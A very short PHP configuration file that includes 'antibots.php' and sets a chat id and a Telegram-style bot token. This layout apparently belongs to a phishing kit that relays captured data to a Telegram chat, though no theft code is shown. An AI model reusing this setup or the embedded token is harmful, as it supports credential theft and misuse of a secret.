<?php
include "antibots.php";
$id="-4760292";
$tokn="7460643301:AAEyZ5dVi1vqJ4";
?>